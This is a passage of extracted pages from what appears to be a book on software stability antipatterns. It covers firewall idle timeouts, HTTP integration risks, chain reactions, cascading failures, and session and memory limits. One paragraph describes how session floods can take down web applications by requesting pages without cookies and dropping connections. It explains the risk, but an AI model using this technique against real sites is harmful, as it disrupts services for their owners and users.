      "content": "Integration Points • 41\n\nin either direction, that match the endpoints of the connection are routed between the firewall’s networks.\n\nSo far, so good. How is this related to my 5 a.m. wake-up calls?\n\nThe key is that table of established connections inside the firewall. It’s finite. Therefore, it does not allow infinite duration connections, even though TCP itself does allow them. Along with the endpoints of the connection, the firewall also keeps a “last packet” time. If too much time elapses without a packet on a connection, the firewall assumes that the endpoints are dead or gone. It just drops the connection from its table, as shown in the following figure. But TCP was never designed for that kind of intelligent device in the middle of a connec- tion. There’s no way for a third party to tell the endpoints that their connection is being torn down. The endpoints assume their connection is valid for an indefinite length of time, even if no packets are crossing the wire.\n\n4. SYN/ACK\n\nRemote Server\n\n8. data/ACK1. SYN\n\n5. ACK time\n\n2. SYN\n\n6. ACK\n\n7. data\n\n9. data/ACK1 hour idle time\n\n10. dataidle time Firewallcheck rulesetforget conndrop packet on ﬂoor\n\n3. SYN/ACK\n\nAs a router, the firewall could have sent an ICMP reset to indicate the route no longer works. However, it could also have been configured to suppress that kind of ICMP traffic, since those can also be used as network probes by the bad guys. Even though this was an interior firewall, it was configured under the assumption that outer tiers would be compromised. So it dropped those packets instead of informing the sender that the destination host couldn’t be reached.\n\nAfter that point, any attempt to read or write from the socket on either end did not result in a TCP reset or an error due to a half-open socket. Instead, the TCP/IP stack sent the packet, waited for an ACK, didn’t get one, and retransmitted. The faithful stack tried and tried to reestablish contact, and that firewall just kept dropping the packets on the floor, without so much as an “ICMP destination unreachable” message. My Linux system, running on\n\nreport erratum • discuss",
      "content_length": 2133,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 54,
      "content": "Chapter 4. Stability Antipatterns • 42\n\na 2.6 series kernel, has its tcp_retries2 set to the default value of 15, which results in a twenty-minute timeout before the TCP/IP stack will inform the socket library that the connection is broken. The HP-UX servers we were using at the time had a thirty-minute timeout. That application’s one-line call to write to a socket could block for thirty minutes! The situation for reading from the socket was even worse. It could block forever.\n\nWhen I decompiled the resource pool class, I saw that it used a last-in, first-out strategy. During the slow overnight times, traffic volume was light enough that a single database connection would get checked out of the pool, used, and checked back in. Then the next request would get the same connection, leaving the thirty-nine others to sit idle until traffic started to ramp up. They were idle well over the one-hour idle connection timeout configured into the firewall.\n\nOnce traffic started to ramp up, those thirty-nine connections per application server would get locked up immediately. Even if the one connection was still being used to serve pages, sooner or later it would be checked out by a thread that ended up blocked on a connection from one of the other pools. Then the one good connection would be held by a blocked thread. Total site hang.\n\nOnce we understood all the links in that chain of failure, we had to find a solution. The resource pool has the ability to test JDBC connections for validity before checking them out. It checked validity by executing a SQL query like “SELECT SYSDATE FROM DUAL.” Well, that would’ve just make the request-handling thread hang anyway. We could also have had the pool keep track of the idle time of the JDBC connection and discard any that were older than one hour. Unfortunately, that strategy involves sending a packet to the database server to tell it that the session is being torn down. Hang.\n\nWe were starting to look at some really hairy complexities, such as creating a “reaper” thread to find connections that were close to getting too old and tearing them down before they timed out. Fortunately, a sharp DBA recalled just the thing. Oracle has a feature called dead connection detection that you can enable to discover when clients have crashed. When enabled, the database server sends a ping packet to the client at some periodic interval. If the client responds, then the database knows it’s still alive. If the client fails to respond after a few retries, the database server assumes the client has crashed and frees up all the resources held by that connection.\n\nWe weren’t that worried about the client crashing. The ping packet itself, however, was what we needed to reset the firewall’s “last packet” time for the connection, keeping the connection alive. Dead connection detection kept the connection alive, which let me sleep through the night.\n\nreport erratum • discuss",
      "content_length": 2931,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 55,
      "content": "Integration Points • 43\n\nThe main lesson here is that not every problem can be solved at the level of abstraction where it manifests. Sometimes the causes reverberate up and down the layers. You need to know how to drill through at least two layers of abstraction to find the “reality” at that level in order to understand problems.\n\nNext, let’s look at problems with HTTP-based protocols.\n\nHTTP Protocols\n\nREST with JSON over HTTP is the lingua franca for services today. No matter what language or framework you use, it boils down to shipping some chunk of formatted, semantically meaningful text as an HTTP request and waiting for an HTTP response.\n\nOf course, all HTTP-based protocols use sockets, so they are vulnerable to all of the problems described previously. HTTP adds its own set of issues, mainly centered around the various client libraries. Let’s consider some of the ways that such an integration point can harm the caller:\n\nThe provider may accept the TCP connection but never respond to the\n\nHTTP request.\n\nThe provider may accept the connection but not read the request. If the request body is large, it might fill up the provider’s TCP window. That causes the caller’s TCP buffers to fill, which will cause the socket write to block. In this case, even sending the request will never finish.\n\nThe provider may send back a response status the caller doesn’t know how to handle. Like “418 I’m a teapot.” Or more likely, “451 Resource censored.”\n\nThe provider may send back a response with a content type the caller doesn’t expect or know how to handle, such as a generic web server 404 page in HTML instead of a JSON response. (In an especially pernicious example, your ISP may inject an HTML page when your DNS lookup fails.)\n\nThe provider may claim to be sending JSON but actually sending plain\n\ntext. Or kernel binaries. Or Weird Al Yankovic MP3s.\n\nUse a client library that allows fine-grained control over timeouts—including both the connection timeout and read timeout—and response handling. I recommend you avoid client libraries that try to map responses directly into domain objects. Instead, treat a response as data until you’ve confirmed it meets your expectations. It’s just text in maps (also known as dictionaries) and lists until you decide what to extract. We’ll revisit this theme in Chapter 11, Security, on page 215.\n\nreport erratum • discuss",
      "content_length": 2380,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 56,
      "content": "Chapter 4. Stability Antipatterns • 44\n\nVendor API Libraries\n\nIt would be nice to think that enterprise software vendors must have hardened their software against bugs, just because they’ve sold it and deployed it for lots of clients. That might be true of the server software they sell, but it’s rarely true for their client libraries. Usually, software vendors provide client API libraries that have a lot of problems and often have stability risks. These libraries are just code coming from regular developers. They have all the variability in quality, style, and safety that you see from any other random sampling of code.\n\nThe worst part about these libraries is that you have so little control over them. If the vendor doesn’t publish source to its client library, then the best you can hope for is to decompile the code—if you’re in a language where that’s even possible—find issues, and report them as bugs. If you have enough clout to apply pressure to the vendor, then you might be able to get a bug fix to its client library, assuming, of course, that you are on the latest version of the vendor’s software. I have been known to fix a vendor’s bugs and recompile my own version for temporary use while waiting for the official patched version.\n\nThe prime stability killer with vendor API libraries is all about blocking. Whether it’s an internal resource pool, socket read calls, HTTP connections, or just plain old Java serialization, vendor API libraries are peppered with unsafe coding practices.\n\nHere’s a classic example. Whenever you have threads that need to synchronize on multiple resources, you have the potential for deadlock. Thread 1 holds lock A and needs lock B, while thread 2 has lock B and needs lock A. The classic recipe for avoiding this deadlock is to make sure you always acquire the locks in the same order and release them in the reverse order. Of course, this helps only if you know that the thread will be acquiring both locks and you can control the order in which they are acquired. Let’s take an example in Java. This illustration could be from some kind of message-oriented mid- dleware library:\n\nstability_anti_patterns/UserCallback.java public interface UserCallback {\n\npublic void messageReceived(Message msg);\n\n}\n\nstability_anti_patterns/Connection.java public interface Connection {\n\npublic void registerCallback(UserCallback callback);\n\npublic void send(Message msg);\n\n}\n\nreport erratum • discuss",
      "content_length": 2444,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 57,
      "content": "Integration Points • 45\n\nI’m sure this looks quite familiar. Is it safe? I have no idea.\n\nWe can’t tell what the execution context will be just by looking at the code. You have to know what thread messageReceived() gets called on, or else you can’t be sure what locks the thread will already hold. It could have a dozen synchro- nized methods on the stack already. Deadlock minefield.\n\nIn fact, even though the UserCallback interface does not declare messageReceived() as synchronized (you can’t declare an interface method as synchronized), the implementation might make it synchronized. Depending on the threading model inside the client library and how long your callback method takes, synchronizing the callback method could block threads inside the client library. Like a plugged drain, those blocked threads can cause threads calling send() to block. Odds are that means request-handling threads will be tied up. As always, once all the request-handling threads are blocked, your application might as well be down.\n\nCountering Integration Point Problems\n\nA stand-alone system that doesn’t integrate with anything is rare, not to mention being almost useless. What can you do to make integration points safer? The most effective stability patterns to combat integration point failures are Circuit Breaker on page 95 and Decoupling Middleware on page 117.\n\nTesting helps, too. Cynical software should handle violations of form and function, such as badly formed headers or abruptly closed connections. To make sure your software is cynical enough, you should make a test harness —a simulator that provides controllable behavior—for each integration test. (See Test Harnesses, on page 113.) Setting the test harness to spit back canned responses facilitates functional testing. It also provides isolation from the target system when you’re testing. Finally, each such test harness should also allow you to simulate various kinds of system and network failures.\n\nThis test harness will immediately help with functional testing. To test for stability, you also need to flip all the switches on the harness while the system is under considerable load. This load can come from a bunch of workstations or cloud instances, but it definitely requires much more than a handful of testers clicking around on their desktops.\n\nRemember This\n\nBeware this necessary evil.\n\nEvery integration point will eventually fail in some way, and you need to be prepared for that failure.\n\nreport erratum • discuss",
      "content_length": 2492,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 58,
      "content": "Chapter 4. Stability Antipatterns • 46\n\nPrepare for the many forms of failure.\n\nIntegration point failures take several forms, ranging from various network errors to semantic errors. You will not get nice error responses delivered through the defined protocol; instead, you’ll see some kind of protocol violation, slow response, or outright hang.\n\nKnow when to open up abstractions.\n\nDebugging integration point failures usually requires peeling back a layer of abstraction. Failures are often difficult to debug at the application layer because most of them violate the high-level protocols. Packet sniffers and other network diagnostics can help.\n\nFailures propagate quickly.\n\nFailure in a remote system quickly becomes your problem, usually as a cascading failure when your code isn’t defensive enough.\n\nApply patterns to avert integration point problems.\n\nDefensive programming via Circuit Breaker, Timeouts (see Timeouts, on page 91), Decoupling Middleware, and Handshaking (see Handshaking, on page 111) will all help you avoid the dangers of integration points.\n\nChain Reactions\n\nThe dominant architectural style today is the horizontally scaled farm of commodity hardware. Horizontal scaling means we add capacity by adding more servers. We sometimes call these “farms.” The alternative, vertical scaling, means building bigger and bigger servers—adding core, memory, and storage to hosts. Vertical scaling has its place, but most of our interactive workload goes to horizontally scaled farms.\n\nIf your system scales horizontally, then you will have load-balanced farms or clusters where each server runs the same applications. The multiplicity of machines provides you with fault tolerance through redundancy. A single machine or process can completely bonk while the remainder continues serving transactions.\n\nStill, even though horizontal clusters are not susceptible to single points of failure (except in the case of attacks of self-denial; see Self-Denial Attacks, on page 69), they can exhibit a load-related failure mode. For example, a concur- rency bug that causes a race condition shows up more often under high load than low load. When one node in a load-balanced group fails, the other nodes must pick up the slack. For example, in the eight-server farm shown in the figure on page 47, each node handles 12.5 percent of the total load.\n\nreport erratum • discuss",
      "content_length": 2382,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 59,
      "content": "Chain Reactions • 47\n\nServer 812.5%\n\nLoad Balancer / Cluster Manager\n\nServer 112.5%\n\nServer 212.5%\n\nServer 312.5%\n\nServer 412.5%\n\nServer 512.5%\n\nClients\n\nServer 612.5%\n\nServer 712.5%\n\nAfter one server pops off, you have the distribution shown in the following figure. Each of the remaining seven servers must handle about 14.3 percent of the total load. Even though each server has to take only 1.8 percent more of the total workload, that server’s load increases by about 15 percent. In the degenerate case of a failure in a two-node cluster, the survivor’s workload doubles. It has its original load (50 percent of the total) plus the dead node’s load (50 percent of the total).\n\nServer 80.00%\n\nServer 114.3%\n\nServer 214.3%\n\nServer 314.3%\n\nServer 414.3%\n\nServer 514.3%\n\nClients\n\nServer 614.3%\n\nServer 714.3%\n\nLoad Balancer / Cluster Manager\n\nIf the first server failed because of some load-related condition, such as a memory leak or intermittent race condition, the surviving nodes become more likely to fail. With each additional server that goes dark, the remaining stalwarts get more and more burdened and therefore are more and more likely to also go dark.\n\nA chain reaction occurs when an application has some defect—usually a resource leak or a load-related crash. We’re already talking about a homoge- neous layer, so that defect is going to be in each of the servers. That means the only way you can eliminate the chain reaction is to fix the underlying defect. Splitting a layer into multiple pools—as in the Bulkhead pattern on page 98—can sometimes help by splitting a single chain reaction into two separate chain reactions that occur at different rates.\n\nreport erratum • discuss",
      "content_length": 1695,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 60,
      "content": "Chapter 4. Stability Antipatterns • 48\n\nWhat effect could a chain reaction have on the rest of the system? Well, for one thing, a chain reaction failure in one layer can easily lead to a cascading failure in a calling layer.\n\nChain reactions are sometimes caused by blocked threads. This happens when all the request-handling threads in an application get blocked and that applica- tion stops responding. Incoming requests will get distributed out to the applica- tions on other servers in the same layer, increasing their chance of failure.\n\nSearching...\n\nI was dealing with a retailer’s primary online brand. It had a huge catalog—half a million SKUs in 100 different categories. For that brand, search wasn’t just helpful; it was necessary. A dozen search engines sitting behind a hardware load balancer handled holiday traffic. The application servers would connect to a virtual IP address instead of specific search engines (see Migratory Virtual IP Addresses, on page 189, for more about load balancing and virtual IP addresses). The load balancer then distribut- ed the application servers’ queries out to the search engines. The load balancer also performed health checks to discover which servers were alive and responsive so it could make sure to send queries only to search engines that were alive.\n\nThose health checks turned out to be useful. The search engine had some bug that caused a memory leak. Under regular traffic (not a holiday season), the search engines would start to go dark right around noon. Because each engine had been taking the same proportion of load throughout the morning, they would all crash at about the same time. As each search engine went dark, the load balancer would send their share of the queries to the remaining servers, causing them to run out of memory even faster. When I looked at a chart of their “last response” timestamps, I could very clearly see an accelerating pattern of crashes. The gap between the first crash and the second would be five or six minutes. Between the second and third would be just three or four minutes. The last two would go down within seconds of each other.\n\nThis particular system also suffered from cascading failures and blocked threads. Losing the last search server caused the entire front end to lock up completely.\n\nUntil we got an effective patch from the vendor (which took months), we had to follow a daily regime of restarts that bracketed the peak hours: 11 a.m., 4 p.m., and 9 p.m.\n\nRemember This\n\nRecognize that one server down jeopardizes the rest.\n\nA chain reaction happens because the death of one server makes the others pick up the slack. The increased load makes them more likely to fail. A chain reaction will quickly bring an entire layer down. Other layers that depend on it must protect themselves, or they will go down in a cas- cading failure.\n\nreport erratum • discuss",
      "content_length": 2876,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 61,
      "content": "Cascading Failures • 49\n\nHunt for resource leaks.\n\nMost of the time, a chain reaction happens when your application has a memory leak. As one server runs out of memory and goes down, the other servers pick up the dead one’s burden. The increased traffic means they leak memory faster.\n\nHunt for obscure timing bugs.\n\nObscure race conditions can also be triggered by traffic. Again, if one server goes down to a deadlock, the increased load on the others makes them more likely to hit the deadlock too.\n\nUse Autoscaling.\n\nIn the cloud, you should create health checks for every autoscaling group. The scaler will shut down instances that fail their health checks and start new ones. As long as the scaler can react faster than the chain reaction propagates, your service will be available.\n\nDefend with Bulkheads.\n\nPartitioning servers with Bulkheads, on page 98, can prevent chain reactions from taking out the entire service—though they won’t help the callers of whichever partition does go down. Use Circuit Breaker on the calling side for that.\n\nCascading Failures\n\nSystem failures start with a crack. That crack comes from some fundamental problem. Maybe there’s a latent bug that some environmental factor triggers. Or there could be a memory leak, or some component just gets overloaded. Things to slow or stop the crack are the topics of the next chapter. Absent those mechanisms, the crack can progress and even be amplified by some structural problems. A cascading failure occurs when a crack in one layer triggers a crack in a calling layer.\n\nAn obvious example is a database failure. If an entire database cluster goes dark, then any application that calls the database is going to experience prob- lems of some kind. What happens next depends on how the caller is written. If the caller handles it badly, then the caller will also start to fail, resulting in a cascading failure. (Just like we draw trees upside-down with their roots pointing to the sky, our problems cascade upward through the layers.)\n\nPretty much every enterprise or web system looks like a set of services grouped into distinct farms or clusters, arranged in layers. Outbound calls from one service funnel through a load balancer to reach the provider. Time was, we talked about “three-tier” systems: web server, app server, and database server.\n\nreport erratum • discuss",
      "content_length": 2354,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 62,
      "content": "Chapter 4. Stability Antipatterns • 50\n\nSometimes search servers were off to the side. Now, we’ve got dozens or hun- dreds of interlinked services, each with their own database. Each service is like its own little stack of layers, which are then connected into layers of dependen- cies beyond that. Every dependency is a chance for a failure to cascade.\n\nCrucial services with a high fan-in—meaning ones with many callers—spread their problems widely, so they are worth extra scrutiny.\n\nCascading failures require some mechanism to transmit the failure from one layer to another. The failure “jumps the gap” when bad behavior in the calling layer gets triggered by the failure condition in the provider.\n\nCascading failures often result from resource pools that get drained because of a failure in a lower layer. Integration points without timeouts are a surefire way to create cascading failures.\n\nThe layer-jumping mechanism often takes the form of blocked threads, but I’ve also seen the reverse—an overly aggressive thread. In one case, the calling layer would get a quick error, but because of a historical precedent it would assume that the error was just an irreproducible, transient error in the lower layer. At some point, the lower layer was suffering from a race condition that would make it kick out an error once in a while for no good reason. The upstream developer decided to retry the call when that happened. Unfortu- nately, the lower layer didn’t provide enough detail to distinguish between the transient error and a more serious one. As a result, once the lower layer started to have some real problems (losing packets from the database because of a failed switch), the caller started to pound it more and more. The more the lower layer whined and cried, the more the upper layer yelled, “I’ll give you something to cry about!” and hammered it even harder. Ultimately, the calling layer was using 100 percent of its CPU making calls to the lower layer and logging failures in calls to the lower layer. A Circuit Breaker, on page 95, would really have helped here.\n\nSpeculative retries also allow failures to jump the gap. A slowdown in the provider will cause the caller to fire more speculative retry requests, tying up even more threads in the caller at a time when the provider is already responding slowly.\n\nJust as integration points are the number-one source of cracks, cascading failures are the number-one crack accelerator. Preventing cascading failures is the very key to resilience. The most effective patterns to combat cascading failures are Circuit Breaker and Timeouts.\n\nreport erratum • discuss",
      "content_length": 2631,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 63,
      "content": "Users • 51\n\nRemember This\n\nStop cracks from jumping the gap.\n\nA cascading failure occurs when cracks jump from one system or layer to another, usually because of insufficiently paranoid integration points. A cascading failure can also happen after a chain reaction in a lower layer. Your system surely calls out to other enterprise systems; make sure you can stay up when they go down.\n\nScrutinize resource pools.\n\nA cascading failure often results from a resource pool, such as a connec- tion pool, that gets exhausted when none of its calls return. The threads that get the connections block forever; all other threads get blocked waiting for connections. Safe resource pools always limit the time a thread can wait to check out a resource.\n\nDefend with Timeouts and Circuit Breaker.\n\nA cascading failure happens after something else has already gone wrong. Circuit Breaker protects your system by avoiding calls out to the troubled integration point. Using Timeouts ensures that you can come back from a call out to the troubled point.\n\nUsers\n\nUsers are a terrible thing. Systems would be much better off with no users.\n\nObviously, I’m being somewhat tongue-in-cheek. Although users do present numerous risks to stability, they’re also the reason our systems exist. Yet the human users of a system have a knack for creative destruction. When your system is teetering on the brink of disaster like a car on a cliff in a movie, some user will be the seagull that lands on the hood. Down she goes! Human users have a gift for doing exactly the worst possible thing at the worst possible time.\n\nWorse yet, other systems that call ours march remorselessly forward like an army of Terminators, utterly unsympathetic about how close we are to crashing.\n\nTraffic\n\nAs traffic grows, it will eventually surpass your capacity. (If traffic isn’t growing, then you have other problems to worry about!) Then comes the biggest question: how does your system react to excessive demand?\n\nreport erratum • discuss",
      "content_length": 1998,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 64,
      "content": "Chapter 4. Stability Antipatterns • 52\n\n“Capacity” is the maximum throughput your system can sustain under a given workload while maintaining acceptable performance. When a transaction takes too long to execute, it means that the demand on your system exceeds its capacity. Internal to your system, however, are some harder limits. Passing those limits creates cracks in the system, and cracks always propagate faster under stress.\n\nIf you are running in the cloud, then autoscaling is your friend. But beware! It’s not hard to run up a huge bill by autoscaling buggy applications.\n\nHeap Memory\n\nOne such hard limit is memory available, particularly in interpreted or man- aged code languages. Take a look at the following figure. Excess traffic can stress the memory system in several ways. First and foremost, in web app back ends, every user has a session. Assuming you use memory-based ses- sions (see Off-Heap Memory, Off-Host Memory, on page 54, for an alternative to in-memory sessions), the session stays resident in memory for a certain length of time after the last request from that user. Every additional user means more memory.\n\nFirstRequest\n\nLastRequest\n\nSessionTimeout\n\nDead Time\n\nSession Active\n\nDuring that dead time, the session still occupies valuable memory. Every object you put into the session sits there in memory, tying up precious bytes that could be serving some other user.\n\nWhen memory gets short, a large number of surprising things can happen. Probably the least offensive is throwing an out-of-memory exception at the user. If things are really bad, the logging system might not even be able to log the error. If no memory is available to create the log event, then nothing gets logged. (This, by the way, is a great argument for external monitoring in addition to log file scraping.) A supposedly recoverable low-memory situation will rapidly turn into a serious stability problem.\n\nYour best bet is to keep as little in the in-memory session as possible. For example, it’s a bad idea to keep an entire set of search results in the session\n\nreport erratum • discuss",
      "content_length": 2098,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 65,
      "content": "for pagination. It’s better if you requery the search engine for each new page of results. For every bit of data you put in the session, consider that it might never be used again. It could spend the next thirty minutes uselessly taking up memory and putting your system at risk.\n\nIt would be wonderful if there was a way to keep things in the session (therefore in memory) when memory is plentiful but automatically be more frugal when memory is tight. Good news! Most language runtimes let you do exactly that with weak references.2 They’re called different things in different libraries, so look for System.WeakReference in C#, java.lang.ref.SoftReference in Java, weakref in Python, and so on. The basic idea is that a weak reference holds another object, called the payload, but only until the garbage collector needs to reclaim memory. When only soft references to the object are left (as shown in the following figure), it can be collected.\n\nExpensiveObject\n\nSoftReference\n\npayload\n\nYou construct a weak reference with the large or expensive object as the payload. The weak reference object actually is a bag of holding. It keeps the payload for later use.\n\nMagicBean hugeExpensiveResult = ...; SoftReference ref = new SoftReference(hugeExpensiveResult);\n\nsession.setAttribute(EXPENSIVE_BEAN_HOLDER, ref);\n\nThis is not a transparent change. Accessors must be aware of the indirection. Think about using a third-party or open source caching library that uses weak references to reclaim memory.\n\nWhat is the point of adding this level of indirection? When memory gets low, the garbage collector is allowed to reclaim any weakly reachable objects. In other words, if there are no hard references to the object, then the payload can be collected. The actual decision about when to reclaim softly reachable objects, how many of them to reclaim, and how many to spare is totally up to the garbage collector. You have to read your runtime’s docs very carefully, but usually the only guarantee is that weakly reachable objects will be reclaimed before an out-of-memory error occurs.\n\n2.\n\nhttps://en.wikipedia.org/wiki/Weak_reference\n\nUsers • 53\n\nreport erratum • discuss",
      "content_length": 2169,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 66,
      "content": "Chapter 4. Stability Antipatterns • 54\n\nIn other words, the garbage collector will take advantage of all the help you give it before it gives up. Be careful to note that it is the payload object that gets garbage-collected, not the weak reference itself. Since the garbage col- lector is allowed to harvest the payload at any time, callers must also be written to behave nicely when the payload is gone. Code that uses the payload object must be prepared to deal with a null. It can choose to recompute the expensive result, redirect the user to some other activity, or take any other protective action.\n\nWeak references are a useful way to respond to changing memory conditions, but they do add complexity. When you can, it’s best to just keep things out of the session.\n\nOff-Heap Memory, Off-Host Memory\n\nAnother effective way to deal with per-user memory is to farm it out to a dif- ferent process. Instead of keeping it inside the heap—that is, inside the address space of your server’s process—move it out to some other process. Memcached is a great tool for this.3 It’s essentially an in-memory key-value store that you can put on a different machine or spread across several machines.\n\nRedis is another popular tool for moving memory out of your process.4 It’s a fast “data structure server” that lives in a space between cache and database. Many systems use Redis to hold session data instead of keeping it in memory or in a relational database.\n\nAny of these approaches exercise a trade-off between total addressable memory size and latency to access it. This notion of memory hierarchy is ranked by size and distance. Registers are fastest and closest to the CPU, followed by cache, local memory, disk, tape, and so on. On one hand, networks have gotten fast enough that “someone else’s memory” can be faster to access than local disk. Your application is better off making a remote call to get a value than reading it from storage. On the other hand, local memory is still faster than remote memory. There’s no one-size-fits-all answer.\n\nSockets\n\nYou may not spend much time thinking about the number of sockets on your server, but that’s another limit you can run into when traffic gets heavy. Every active request corresponds to an open socket. The operating system assigns inbound connections to an “ephemeral” port that represents the receiving\n\n3. 4.\n\nwww.memcached.org\n\nwww.redis.io\n\nreport erratum • discuss",
      "content_length": 2425,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 67,
      "content": "side of the connection. If you look at the TCP packet format, you’ll see that a port number is 16 bits long. It can only go up to 65535. Different OSs use different port ranges for ephemeral sockets, but the IANA recommended range is 49152 to 65535. That gives your server the ability to have at most 16,383 connections open. But your machine is probably dedicated to your service rather than handling, say, user logins. So we can stretch that range to ports 1024–65535, for a maximum of 64,511 connections.\n\nNow I’ll tell you that some servers are handling more than a million concurrent connections. Some people are pushing toward ten million connections on a single machine.\n\nIf there are only 64,511 ports available for connections, how can a server have a million connections? The secret is virtual IP addresses. The operating system binds additional IP addresses to the same network interface. Each IP address has its own range of port numbers, so we would need a total of 16 IP addresses to handle that many connections.\n\nThis is not a trivial thing to tackle. Your application will probably need some changes to listen on multiple IP addresses and handle connections across them all without starving any of the listen queues. A million connections also need a lot of kernel buffers. Plan to spend some time learning about your operating system’s TCP tuning parameters.\n\nClosed Sockets\n\nNot only can open sockets be a problem, but the ones you’ve already closed can bite you too. After your application code closes a socket, the TCP stack moves it through a couple of terminal states. One of them is the TIME_WAIT state. TIME_WAIT is a delay period before the socket can be reused for a new connection. It’s there as part of TCP’s defense against bogons.\n\nNo, really. Bogons. I’m not making this up.\n\nA bogon is a wandering packet that got routed inefficiently and arrives late, possibly out of sequence, and after the connection is closed. If the socket were reused too quickly, then a bogon could arrive with the exact right com- bination of IP address, destination port number, and TCP sequence number to be accepted as legitimate data for the new connection. In essence a bit of data from the old connection would show up midstream in the new one.\n\nBogons are a real, though minor, problem on the Internet at large. Within your data center or cloud infrastructure, though, they are less likely to be an issue. You can turn the TIME_WAIT interval down to get those ports back into use ASAP.\n\nUsers • 55\n\nreport erratum • discuss",
      "content_length": 2538,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 68,
      "content": "Chapter 4. Stability Antipatterns • 56\n\nExpensive to Serve\n\nSome users are way more demanding than others. Ironically, these are usu- ally the ones you want more of. For example, in a retail system, users who browse a couple of pages, maybe do a search, and then go away are both the bulk of users and the easiest to serve. Their content can usually be cached (however, see Use Caching, Carefully, on page 67, for important cautions about caching). Serving their pages usually does not involve external integra- tion points. You will likely do some personalization, maybe some clickstream tracking, and that’s about it.\n\nBut then there’s that user who actually wants to buy something. Unless you’ve licensed the one-click checkout patent, checkout probably takes four or five pages. That’s already as many pages as a typical user’s entire session. On top of that, checking out can involve several of those troublesome inte- gration points: credit card authorization, sales tax calculation, address standardization, inventory lookups, and shipping. In fact, more buyers don’t just increase the stability risk for the front-end system, they can place back- end or downstream systems at risk too. (See Unbalanced Capacities, on page 75.) Increasing the conversion rate might be good for the profit-and-loss statement, but it’s definitely hard on the systems.\n\nThere is no effective defense against expensive users. They are not a direct stability risk, but the increased stress they produce increases the likelihood of triggering cracks elsewhere in the system. Still, I don’t recommend measures to keep them off the system, since they are usually the ones who generate revenue. So, what should you do?\n\nThe best thing you can do about expensive users is test aggressively. Identify whatever your most expensive transactions are and double or triple the pro- portion of those transactions. If your retail system expects a 2 percent conver- sion rate (which is about standard for retailers), then your load tests should test for a 4, 6, or 10 percent conversion rate.\n\nIf a little is good, then a lot must be better, right? In other words, why not test for a 100 percent conversion rate? As a stability test, that’s not a bad idea. I wouldn’t use the results to plan capacity for regular production traffic, though. By definition, these are the most expensive transactions. Therefore, the average stress on the system is guaranteed to be less than what this test produces. Build the system to handle nothing but the most expensive trans- actions and you will spend ten times too much on hardware.\n\nreport erratum • discuss",
      "content_length": 2618,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 69,
      "content": "Unwanted Users\n\nWe would all sleep easier if the only users to worry about were the ones handing us their credit card numbers. In keeping with the general theme of “weird, bad things happen in the real world,” weird, bad users are definitely out there.\n\nSome of them don’t mean to be bad. For example, I’ve seen badly configured proxy servers start requesting a user’s last URL over and over again. I was able to identify the user’s session by its cookie and then trace the session back to the registered customer. Logs showed that the user was legitimate. For some reason, fifteen minutes after the user’s last request, the request started reappearing in the logs. At first, these requests were coming in every thirty seconds. They kept accelerating, though. Ten minutes later, we were getting four or five requests every second. These requests had the user’s identifying cookie but not his session cookie. So each request was creating a new session. It strongly resembled a DDoS attack, except that it came from one particular proxy server in one location.\n\nOnce again, we see that sessions are the Achilles’ heel of web applications. Want to bring down nearly any dynamic web application? Pick a deep link from the site and start requesting it without sending cookies. Don’t even wait for the response; just drop the socket connection as soon as you’ve sent the request. Web servers never tell the application servers that the end user stopped listening for an answer. The application server just keeps on process- ing the request. It sends the response back to the web server, which funnels it into the bit bucket. In the meantime, the 100 bytes of the HTTP request cause the application server to create a session (which may consume several kilobytes of memory in the application server). Even a desktop machine on a broadband connection can generate hundreds of thousands of sessions on the application servers.\n\nIn extreme cases, such as the flood of sessions originating from the single location, you can run into problems worse than just heavy memory consump- tion. In our case, the business users wanted to know how often their most loyal customers came back. The developers wrote a little interceptor that would update the “last login” time whenever a user’s profile got loaded into memory from the database. During these session floods, though, the request presented a user ID cookie but no session cookie. That meant each request was treated like a new login, loading the profile from the database and attempting to update the “last login” time.\n\nUsers • 57\n\nreport erratum • discuss",
      "content_length": 2596,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 70,
      "content": "Chapter 4. Stability Antipatterns • 58\n\nSession Tracking\n\nHTTP is a singularly unlikely protocol. If you were tasked with creating a protocol to facilitate arts, sciences, commerce, free speech, words, pictures, sound, and video, one that could weave the vastness of human knowledge and creativity into a single web, it is unlikely that you would arrive at HTTP. HTTP is stateless, for one thing. To the server, each new requester emerges from the swirling fog and makes some demand like “GET /site/index.jsp.” Once answered, they disappear back into the fog without so much as a thank you. Should one of these rude, demanding clients reappear, the server, in perfectly egalitarian ignorance, doesn’t recognize that it has seen them before.\n\nSome clever folks at Netscape found a way to graft an extra bit of data into the protocol. Netscape originally conceived this data, called cookies (for no compelling reason), as a way to pass state back and forth from client to server and vice versa. Cookies are a clever hack. They allowed all kinds of new applications, such as personalized portals (a big deal back then) and shopping sites. Security-minded application developers quickly realized, however, that unencrypted cookie data was open to manipulation by hostile clients. So, security dictates that the cookie either cannot contain actual data or must be encrypted. At the same time, high-volume sites found that passing real state in cookies uses up lots of expensive bandwidth and CPU time. Encrypting the cookies was right out.\n\nSo cookies started being used for smaller pieces of data, just enough to tag a user with a persistent cookie or a temporary cookie to identify a session.\n\nA session is an abstraction that makes building applications easier. All the user really sends are a series of HTTP requests. The web server receives these and, through a series of machinations, returns an HTTP response. There is no “begin a session” request by which the web browser can indicate it is about to start sending requests, and there is no “session finished” request. (The web server could not trust that such an indicator would be sent anyway.)\n\nSessions are all about caching data in memory. Early CGI applications had no need for a session, since they would fire up a new process (usually a Perl script) for each new request. That worked fine. There’s nothing quite as safe as the “fork, run, and die” model. To reach higher volumes, however, developers and vendors turned to long-running application servers, such as Java application servers and long-running Perl processes via mod_perl. Instead of waiting for a process fork on each request, the server is always running, waiting for requests. With the long-running server, you can cache state from one request to another, reducing the number of hits to the database. Then you need some way to identify a request as part of a session. Cookies work well for this.\n\nApplication servers handle all the 